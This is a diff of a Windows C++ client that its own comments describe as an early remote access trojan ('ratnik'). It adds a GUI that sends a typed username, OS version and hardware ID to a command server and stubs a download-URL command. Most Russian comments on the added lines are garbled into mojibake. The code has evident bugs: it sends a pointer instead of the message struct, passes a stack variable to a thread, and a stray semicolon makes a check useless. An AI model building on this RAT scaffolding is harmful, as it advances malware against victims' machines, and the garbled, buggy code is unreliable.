@@ -1,8 +1,10 @@
-#include "winsock2.h"
+п»ї#include "winsock2.h"
+//#include "windows.h"
 #include "intrin.h"
 #include "ntdll.h"
 #include "iphlpapi.h"
 #include "stdio.h"
+#include "resource.h"
 #include <string>
 #include <iostream>
 
@@ -12,16 +14,19 @@
 
 using namespace std;
 
+WCHAR szClassName[] = L"XAKEPSOFT";
+HWND TextField1, TextField2, TextField3, SendButton;
+
 SOCKET Socket;
 SOCKADDR_IN ServerAddr;
 
-//полностью копируем структуры из сервера
+//РїРѕР»РЅРѕСЃС‚СЊСЋ РєРѕРїРёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂС‹ РёР· СЃРµСЂРІРµСЂР°
 struct CLIENTS
 {
-	SOCKET NUMBER; //это поле мы заполнять не будем, так как оно не важно
-	char USERNAME[100]; //поле в которое мы скопируем имя юзера
-	char OSVER[100]; //поле в которое мы скопируем версию ос
-	char HWID[100]; //уникальное поле для этого юзера
+	SOCKET NUMBER; //СЌС‚Рѕ РїРѕР»Рµ РјС‹ Р·Р°РїРѕР»РЅСЏС‚СЊ РЅРµ Р±СѓРґРµРј, С‚Р°Рє РєР°Рє РѕРЅРѕ РЅРµ РІР°Р¶РЅРѕ
+	char USERNAME[100]; //РїРѕР»Рµ РІ РєРѕС‚РѕСЂРѕРµ РјС‹ СЃРєРѕРїРёСЂСѓРµРј РёРјСЏ СЋР·РµСЂР°
+	char OSVER[100]; //РїРѕР»Рµ РІ РєРѕС‚РѕСЂРѕРµ РјС‹ СЃРєРѕРїРёСЂСѓРµРј РІРµСЂСЃРёСЋ РѕСЃ
+	char HWID[100]; //СѓРЅРёРєР°Р»СЊРЅРѕРµ РїРѕР»Рµ РґР»СЏ СЌС‚РѕРіРѕ СЋР·РµСЂР°
 };
 
 struct DLE
@@ -29,28 +34,120 @@ struct DLE
 	char URL[100];
 };
 
-//полностью копируем структуры из сервера
+//РїРѕР»РЅРѕСЃС‚СЊСЋ РєРѕРїРёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂС‹ РёР· СЃРµСЂРІРµСЂР°
 struct CMDiDATA
 {
-	DWORD CMD; //тут у нас будут номера комманд
-	char DATA[1000]; //а тут данные которые мы хотим принять или отправить серверу
+	DWORD CMD; //С‚СѓС‚ Сѓ РЅР°СЃ Р±СѓРґСѓС‚ РЅРѕРјРµСЂР° РєРѕРјРјР°РЅРґ
+	char DATA[1000]; //Р° С‚СѓС‚ РґР°РЅРЅС‹Рµ РєРѕС‚РѕСЂС‹Рµ РјС‹ С…РѕС‚РёРј РїСЂРёРЅСЏС‚СЊ РёР»Рё РѕС‚РїСЂР°РІРёС‚СЊ СЃРµСЂРІРµСЂСѓ
 };
+
+DWORD WINAPI SendThread(LPVOID param)
+{
+	send(Socket, (char*)&param, sizeof(CMDiDATA), 0);
+	return 0;
+}
+
+
+LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	switch (message)
+	{
+	case WM_CREATE:
+
+		TextField1 = CreateWindow(L"EDIT",
+			L"",
+			WS_VISIBLE | WS_CHILD,
+			10, 10, 465, 16,
+			hwnd, (HMENU)1, NULL, NULL);
+
+		TextField2 = CreateWindow(L"EDIT",
+			L"",
+			WS_VISIBLE | WS_CHILD,
+			10, 34, 465, 16,
+			hwnd, (HMENU)2, NULL, NULL);
+
+		TextField3 = CreateWindow(L"EDIT",
+			L"",
+			WS_VISIBLE | WS_CHILD,
+			10, 60, 465, 16,
+			hwnd, (HMENU)3, NULL, NULL);
+
+		SendButton = CreateWindow(L"BUTTON",
+			L"SEND",
+			WS_VISIBLE | WS_CHILD,
+			10, 220, 100, 36,
+			hwnd, (HMENU)4, NULL, NULL);
+		break;
+
+	case WM_COMMAND:
+		switch (wParam)
+		{
+			case 4:
+			{
+				char *USERNAME, *OSVER, *HWID;
+				int len1 = GetWindowTextLength(TextField1) + 1;
+				int len2 = GetWindowTextLength(TextField2) + 1;
+				int len3 = GetWindowTextLength(TextField3) + 1;
+				if (len1 > 1 && len2 > 1 && len3 > 1)
+				{
+					USERNAME = (char*)malloc(len1);
+					OSVER = (char*)malloc(len2);
+					HWID = (char*)malloc(len3);
+
+					GetWindowTextA(TextField1, &USERNAME[0], len1);
+					GetWindowTextA(TextField2, &OSVER[0], len2);
+					GetWindowTextA(TextField3, &HWID[0], len3);
+
+					printf("USERNAME: %s\nOSVER: %s\nHWID: %s\n", USERNAME, OSVER, HWID);
+
+					CMDiDATA indata; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РїСЂРѕС‚РѕРєРѕР»
+					CLIENTS client; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РёРЅС„Сѓ Рѕ РєР»РёРµРЅС‚Рµ
+					memset(&indata, 0, sizeof(CMDiDATA)); //РїРѕС‡РёСЃС‚РёРј 
+					memset(&client, 0, sizeof(CLIENTS)); //РїРѕС‡РёСЃС‚РёРј
+					memcpy(client.HWID, HWID, sizeof(client.HWID));
+					memcpy(client.USERNAME, USERNAME, sizeof(client.USERNAME));
+					memcpy(client.OSVER, OSVER, sizeof(client.OSVER));
+					indata.CMD = 0;
+					memcpy(indata.DATA, &client, sizeof(CLIENTS));
+
+					if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
+					{
+						CreateThread(NULL, 0, SendThread, (LPVOID)&indata, 0, 0);
+					}
+
+					free(USERNAME);
+					free(OSVER);
+					free(HWID);
+				}
+				break;
+			}
+		}
+		break;
+
+	case WM_DESTROY:
+		PostQuitMessage(0); 
+		break;
+	default:
+		return DefWindowProc(hwnd, message, wParam, lParam);
+	}
+	return 0;
+}
 
 DWORD WINAPI RecvThread(LPVOID param)
 {
 	while (TRUE)
 	{
-		CMDiDATA indata; //создаем структуру отвечающую за протокол
-		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //прием сообщения от клиента
+		CMDiDATA indata; //СЃРѕР·РґР°РµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ РѕС‚РІРµС‡Р°СЋС‰СѓСЋ Р·Р° РїСЂРѕС‚РѕРєРѕР»
+		memset(&indata, 0, sizeof(CMDiDATA)); //РїРѕС‡РёСЃС‚РёРј 
+		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)); //РїСЂРёРµРј СЃРѕРѕР±С‰РµРЅРёСЏ РѕС‚ РєР»РёРµРЅС‚Р°
 		{
 			switch (indata.CMD)
 			{
-				case 1://если indata.cmd == 1
+				case 1://РµСЃР»Рё indata.cmd == 1
 				{
-					DLE dle; //инициализируем структуру DLE
-					memset(&dle, 0, sizeof(dle)); //очищаем ее
-					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA
+					DLE dle; //РёРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂСѓ DLE
+					memset(&dle, 0, sizeof(dle)); //РѕС‡РёС‰Р°РµРј РµРµ
+					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //Рё РєРѕРїРёСЂСѓРµРј РІ РЅРµРµ indata.DATA
 					break;
 				}
 				default:
@@ -60,90 +157,7 @@ DWORD WINAPI RecvThread(LPVOID param)
 	}
 }
 
-DWORD WINAPI ConsoleReader(LPVOID param)
-{
-	while (TRUE)
-	{
-		string line = { 0 }; //инициализируем класс стринг
-		getline(cin, line); //считываем символы в этот класс из консоли
-		char* mycmd = strdup(line.c_str()); //конвертируем эти сиволы в чары, вызывая метод с_str
-
-		if (mycmd[0] != 0)
-		{
-			int i, j;
-			char CMDCHAR[sizeof(int)];
-			memset(CMDCHAR, 0, sizeof(CMDCHAR));
-			int CMD = 0;
-			for (i = 0, j = 0; ; i++, j++)
-			{
-				if (mycmd[i] == ':')
-				{
-					break;
-				}
-				CMDCHAR[j] = mycmd[i];
-			}
-			CMD = atoi(CMDCHAR);
-			printf("CMD: %d\n", CMD);
-			
-			int x, y;
-			char USERNAME[100];
-			memset(USERNAME, 0, sizeof(USERNAME));
-			for (x = i + 1, y = 0; ; x++, y++)
-			{
-				if (mycmd[x] == ':')
-				{
-					break;
-				}
-				USERNAME[y] = mycmd[x];
-			}
-			printf("USERNAME: %s\n", USERNAME);
-
-			int a, b;
-			char OSVER[100];
-			memset(OSVER, 0, sizeof(OSVER));
-			for (a = x + 1, b = 0; ; a++, b++)
-			{
-				if (mycmd[a] == ':')
-				{
-					break;
-				}
-				OSVER[b] = mycmd[a];
-			}
-			printf("OSVER: %s\n", OSVER);
-
-			int n, m;
-			char HWID[100];
-			memset(HWID, 0, sizeof(HWID));
-			for (n = a + 1, m = 0; ; n++, m++)
-			{
-				if (mycmd[n] == ':')
-				{
-					break;
-				}
-				HWID[m] = mycmd[n];
-			}
-			printf("HWID: %s\n", HWID);
-
-			if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
-			{
-				//если мы подключились то передаем хендшейк:)
-				CMDiDATA indata; //создаем структуру отвечающую за протокол
-				CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
-				memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
-				memset(&client, 0, sizeof(CLIENTS)); //почистим
-				memcpy(client.HWID, HWID, sizeof(client.HWID));
-				memcpy(client.USERNAME, USERNAME, sizeof(client.USERNAME));
-				memcpy(client.OSVER, OSVER, sizeof(client.OSVER));
-				indata.CMD = CMD;
-				memcpy(indata.DATA, &client, sizeof(CLIENTS));
-				send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
-			}
-			closesocket(Socket);
-		}
-	}
-}
-
-//будущая точка входа нашего ратника
+//Р±СѓРґСѓС‰Р°СЏ С‚РѕС‡РєР° РІС…РѕРґР° РЅР°С€РµРіРѕ СЂР°С‚РЅРёРєР°
 int CALLBACK WinMain(HINSTANCE hInstance,
 	HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine,
@@ -155,22 +169,65 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	freopen("CONOUT$", "w", stdout);
 	freopen("CONOUT$", "w", stderr);
 
-	SetConsoleTitleA("XAKEP");
+	SetConsoleTitleA("XAKEPSOFT");
 
-	//инициализируем структуры винсока
+	HWND hwnd;               /* This is the handle for our window */
+	MSG messages;            /* Here messages to the application are saved */
+	WNDCLASSEX wincl;        /* Data structure for the windowclass */
+								/* The Window structure */
+	wincl.hInstance = hInstance;
+	wincl.lpszClassName = szClassName;
+	wincl.lpfnWndProc = WindowProcedure;
+	wincl.style = CS_CLASSDC;
+	wincl.cbSize = sizeof(WNDCLASSEX);
+	wincl.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
+	wincl.hIconSm = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
+	wincl.hCursor = LoadCursor(NULL, IDC_ARROW);
+	wincl.lpszMenuName = NULL;
+	wincl.cbClsExtra = 0;
+	wincl.cbWndExtra = 0;
+	wincl.hbrBackground = (HBRUSH)COLOR_BACKGROUND;
+
+	if (!RegisterClassEx(&wincl))
+		return 0;
+	hwnd = CreateWindowEx(
+		0,
+		szClassName,
+		L"XAKEPSOFT",
+		WS_OVERLAPPEDWINDOW,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		500,
+		305,
+		HWND_DESKTOP,
+		NULL,
+		hInstance,
+		NULL
+	);
+	ShowWindow(hwnd, nCmdShow);
+
+	//РёРЅРёС†РёР°Р»РёР·РёСЂСѓРµРј СЃС‚СЂСѓРєС‚СѓСЂС‹ РІРёРЅСЃРѕРєР°
 	struct WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
 	WSAStartup(DLLVersion, &wsaData);
 
 	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	ServerAddr.sin_family = AF_INET;
-	//задаем конект на локалхост к восьмидесятому порту
+	//Р·Р°РґР°РµРј РєРѕРЅРµРєС‚ РЅР° Р»РѕРєР°Р»С…РѕСЃС‚ Рє РІРѕСЃСЊРјРёРґРµСЃСЏС‚РѕРјСѓ РїРѕСЂС‚Сѓ
 	ServerAddr.sin_port = htons(80);
 	ServerAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
-	//подключаемся к серверу!!!
 
 	HANDLE RECV[2];
-	RECV[0] = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
-	RECV[1] = CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0);
-	WaitForMultipleObjects(2, RECV, TRUE, INFINITE); //Бесконечно ожидаем пока этот тред работает...
+	RECV[0] = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //СЃРѕР·РґР°РµРј С‚СЂРµРґ РєРѕС‚РѕСЂС‹Р№ Р±СѓРґРµС‚ Р±РµСЃРєРѕРЅРµС‡РЅРѕ РїСЂРёРЅРёРјР°С‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ РѕС‚ СЃРµСЂРІРµСЂР°
+	//RECV[1] = CreateThread(NULL, 0, ConsoleReader, NULL, 0, 0);
+	//РґР°РЅРЅР°СЏ С„СѓРЅРєС†РёСЏ РґРѕР»Р¶РЅР° Р±СѓРґРµС‚ РѕР¶РёРґР°С‚СЊ Р·Р°РІРµСЂС€РµРЅРёСЏ РЅР°С€РёС… РІРґСѓС… РїРѕС‚РѕРєРѕРІ, РЅРѕ С‚РµРїРµСЂСЊ РЅР°РґРѕР±РЅРѕСЃС‚СЊ РІ РЅРµР№ РѕС‚РїР°Р»Р° - С‚Р°Рє РєР°Рє РјС‹ СЂРёСЃСѓРµРј С‚РµРїРµСЂСЊ РѕРєРЅРѕ
+	//WaitForMultipleObjects(2, RECV, TRUE, INFINITE); //Р‘РµСЃРєРѕРЅРµС‡РЅРѕ РѕР¶РёРґР°РµРј РїРѕРєР° СЌС‚РѕС‚ С‚СЂРµРґ СЂР°Р±РѕС‚Р°РµС‚...
+
+	while (GetMessage(&messages, NULL, 0, 0))
+	{
+		TranslateMessage(&messages);
+		DispatchMessage(&messages);
+	}
+
+	return messages.wParam;
 }
